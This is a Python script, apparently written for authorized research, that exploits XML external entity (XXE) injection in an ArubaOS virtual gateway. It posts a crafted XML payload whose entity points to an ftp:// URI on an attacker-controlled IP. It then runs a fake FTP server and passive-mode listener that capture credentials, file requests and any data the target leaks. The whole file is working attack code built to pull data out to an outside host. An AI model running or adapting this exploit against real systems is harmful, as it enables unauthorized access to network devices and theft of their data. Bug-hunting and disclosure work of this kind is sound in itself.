#!/usr/bin/env python3
"""
XXE FTP PASV Tester — ArubaOS vGW Authorized Research
Author: Vesqer / JM00NJ

Goal:
  1. Trigger XXE with ftp:// URI
  2. Complete full FTP dialog including PASV response
  3. Open data listener — capture if controller initiates data connection
  4. Log everything for bug report evidence
"""

import socket
import threading
import subprocess
import time
import os

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_IP    = "192.168.56.50"
TARGET_PORT  = 32000
ATTACKER_IP  = "192.168.56.102"
FTP_PORT     = 9993   # control channel
DATA_PORT    = 9980   # PASV data channel (attacker listens here)
# ──────────────────────────────────────────────────────────────────────────────

# Convert DATA_PORT to PASV format: port = p1*256 + p2
def pasv_format(ip, port):
    ip_parts = ip.replace(".", ",")
    p1 = port >> 8
    p2 = port & 0xFF
    return f"227 Entering Passive Mode ({ip_parts},{p1},{p2})\r\n"

PASV_RESPONSE = pasv_format(ATTACKER_IP, DATA_PORT)

# ─── DATA CHANNEL LISTENER ────────────────────────────────────────────────────
data_result = {"status": "[-] No data connection", "data": b""}

def data_listener(port, timeout=15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(timeout)
        print(f"  [DATA] Listening on :{port} for incoming data connection...")
        conn, addr = s.accept()
        conn.settimeout(5)
        chunks = []
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        conn.close()
        raw = b"".join(chunks)
        if raw:
            data_result["status"] = f"[+] DATA CONNECTION from {addr[0]} — {len(raw)} bytes received"
            data_result["data"]   = raw
        else:
            data_result["status"] = f"[+] DATA CONNECTION from {addr[0]} — connected but no data"
    except socket.timeout:
        data_result["status"] = "[-] No data connection (timeout)"
    except Exception as e:
        data_result["status"] = f"[!] Data listener error: {e}"
    finally:
        s.close()

# ─── FTP CONTROL SERVER ───────────────────────────────────────────────────────
ftp_log  = []
ftp_done = threading.Event()

def ftp_control_server(port, timeout=15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        s.settimeout(timeout)
        conn, addr = s.accept()
        conn.settimeout(5)
        ftp_log.append(f"[CONNECT] {addr[0]}:{addr[1]}")

        def send(msg):
            conn.send(msg.encode())
            ftp_log.append(f"SENT:  {msg.strip()}")

        def recv():
            try:
                data = conn.recv(1024).decode(errors="replace").strip()
                ftp_log.append(f"RECV:  {data}")
                return data
            except socket.timeout:
                ftp_log.append("RECV:  <timeout>")
                return ""

        # ── FTP Dialog ────────────────────────────────────────────
        send("220 FTP Server Ready\r\n")

        cmd = recv()
        if cmd.upper().startswith("USER"):
            send("331 Password required\r\n")
        else:
            send("331 Password required\r\n")

        cmd = recv()
        if cmd.upper().startswith("PASS"):
            send("230 Login successful\r\n")
        else:
            send("230 Login successful\r\n")

        # Handle commands until PASV or client disconnects
        for _ in range(10):
            cmd = recv()
            if not cmd:
                break

            if cmd.upper().startswith("PASV"):
                # Send PASV response pointing to our data listener
                ftp_log.append(f"[PASV] Responding with data port {DATA_PORT}")
                send(PASV_RESPONSE)

                # Give controller a moment to open data connection
                time.sleep(0.5)

                # Handle TYPE I / SIZE / MDTM then RETR or LIST
                for _ in range(8):
                    cmd2 = recv()
                    if not cmd2:
                        break
                    if cmd2.upper().startswith("TYPE"):
                        send("200 Type set to I\r\n")
                    elif cmd2.upper().startswith("SIZE"):
                        send("213 1024\r\n")
                    elif cmd2.upper().startswith("MDTM"):
                        send("213 20260101000000\r\n")
                    elif cmd2.upper().startswith("RETR"):
                        filename = cmd2[5:].strip() if len(cmd2) > 5 else "unknown"
                        ftp_log.append(f"[!!!] RETR REQUESTED: {filename}")
                        send("150 Opening BINARY mode data connection\r\n")
                        time.sleep(3)
                        send("226 Transfer complete\r\n")
                        break
                    elif cmd2.upper().startswith("LIST"):
                        ftp_log.append("[!!!] LIST REQUESTED — directory listing attempt")
                        send("150 Opening ASCII mode data connection\r\n")
                        time.sleep(3)
                        send("226 Transfer complete\r\n")
                        break
                    elif cmd2.upper().startswith("QUIT"):
                        send("221 Goodbye\r\n")
                        break
                    else:
                        send(f"500 Unknown command\r\n")

            elif cmd.upper().startswith("TYPE"):
                send("200 Type set to I\r\n")
            elif cmd.upper().startswith("SIZE"):
                send("213 1024\r\n")
            elif cmd.upper().startswith("QUIT"):
                send("221 Goodbye\r\n")
                break
            else:
                send("500 Unknown command\r\n")

        conn.close()
    except socket.timeout:
        ftp_log.append("[TIMEOUT] No connection")
    except Exception as e:
        ftp_log.append(f"[ERROR] {e}")
    finally:
        s.close()
        ftp_done.set()

# ─── PAYLOAD ──────────────────────────────────────────────────────────────────
def build_ftp_payload(attacker_ip, port):
    uri = f"ftp://{attacker_ip}:{port}/test.txt"
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{uri}">]>\n'
        '<aruba><opcode>&xxe;</opcode></aruba>'
    )

def send_payload(xml_payload, timeout=12):
    cmd = [
        "curl", "-s", "-i", "-X", "POST",
        f"http://{TARGET_IP}:{TARGET_PORT}/",
        "-H", "Content-Type: text/xml",
        "--max-time", str(timeout),
        "-d", xml_payload,
    ]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 2)
        return out.stdout
    except Exception as e:
        return f"curl error: {e}"

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    print(f"\n{'='*60}")
    print(f"  XXE FTP PASV Tester | Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"  FTP control: :{FTP_PORT}  |  PASV data: :{DATA_PORT}")
    print(f"  PASV response: {PASV_RESPONSE.strip()}")
    print(f"{'='*60}\n")

    # Start data listener first
    dt = threading.Thread(target=data_listener, args=(DATA_PORT, 20), daemon=True)
    dt.start()
    time.sleep(0.3)

    # Start FTP control server
    ft = threading.Thread(target=ftp_control_server, args=(FTP_PORT, 15), daemon=True)
    ft.start()
    time.sleep(0.4)

    print(f"[*] Sending XXE payload with ftp://{ATTACKER_IP}:{FTP_PORT}/test.txt\n")
    response = send_payload(build_ftp_payload(ATTACKER_IP, FTP_PORT))

    # Wait for FTP dialog to complete
    ftp_done.wait(timeout=18)
    dt.join(timeout=22)

    # ── Print FTP dialog ─────────────────────────────────────────
    print("[*] FTP Control Channel Dialog:")
    print(f"    {'-'*50}")
    for line in ftp_log:
        print(f"    {line}")
    print(f"    {'-'*50}\n")

    # ── Print data channel result ─────────────────────────────────
    print("[*] FTP Data Channel (PASV):")
    print(f"    {data_result['status']}")
    if data_result["data"]:
        print(f"    Raw data ({len(data_result['data'])} bytes):")
        try:
            print(f"    {data_result['data'].decode(errors='replace')[:500]}")
        except Exception:
            print(f"    {data_result['data'][:200]}")
    print()

    # ── Summary ──────────────────────────────────────────────────
    print(f"{'='*60}")
    print("  SUMMARY")
    print(f"{'='*60}")

    creds = [l for l in ftp_log if "USER" in l or "PASS" in l]
    pasv  = [l for l in ftp_log if "PASV" in l]
    retr  = [l for l in ftp_log if "RETR" in l or "LIST" in l]

    print(f"  Credentials disclosed : {', '.join(creds) if creds else 'none'}")
    print(f"  PASV triggered        : {'YES' if pasv else 'NO'}")
    print(f"  File retrieval cmd    : {', '.join(retr) if retr else 'none'}")
    print(f"  Data connection       : {data_result['status'].split('|')[0].strip()}")

    if data_result["data"]:
        print("\n  [!!!] DATA RECEIVED — controller exfiltrated content via FTP")
    elif pasv:
        print("\n  [!] PASV triggered — controller attempted data connection")
        print("      → Evidence of active file retrieval attempt via FTP SSRF")
    print()

if __name__ == "__main__":
    main()
